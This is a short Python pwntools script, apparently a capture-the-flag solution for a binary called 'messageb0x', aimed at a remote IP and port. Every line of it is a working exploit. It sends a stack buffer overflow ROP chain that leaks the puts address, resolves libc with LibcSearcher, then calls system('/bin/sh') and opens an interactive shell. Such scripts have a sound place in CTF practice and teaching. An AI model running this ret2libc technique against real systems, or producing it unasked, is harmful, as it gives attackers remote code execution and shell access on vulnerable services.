from pwn import *
from LibcSearcher import LibcSearcher
# x86 # nx
context.log_level = "debug"
# p = process("./messageb0x")
p = remote("101.71.29.5" , 10009)
elf = ELF("./messageb0x")

p.sendlineafter("who you are:\n" , "fantasy")
p.sendlineafter("email address:\n" , "fantasy@qq.com")

payload1 = "a" * 0x58 + "b" * 0x4 
# payload1 += p32(elf.plt["puts"]) + p32(elf.sym["jumper"]) + p32(elf.got["puts"])
payload1 += p32(elf.plt["puts"]) + p32(0x80492BE) + p32(elf.got["puts"])
p.sendlineafter("want to say:\n" , payload1)
p.recvuntil("--> Thank you !\n")
puts_addr = u32(p.recv(4))

libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

payload2 = "a" * 0x1c + "b" * 4 
payload2 += p32(system) + p32(str_bin_sh) + p32(str_bin_sh)
p.sendlineafter("version?\n" , payload2)
p.interactive()